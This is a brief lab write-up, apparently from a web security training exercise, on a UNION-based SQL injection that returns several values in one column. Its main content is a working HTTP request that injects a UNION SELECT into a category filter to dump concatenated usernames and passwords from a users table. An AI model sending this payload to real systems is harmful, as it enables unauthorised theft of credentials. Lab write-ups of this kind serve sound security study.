# **UNION attack, retrieving multiple values in a single column**

In this one first I had to check which column accepted string, and then used:

```
GET /filter?category=Pets'+UNION+SELECT+NULL,CONCAT(username,password)+FROM+users+--+- HTTP/2
```
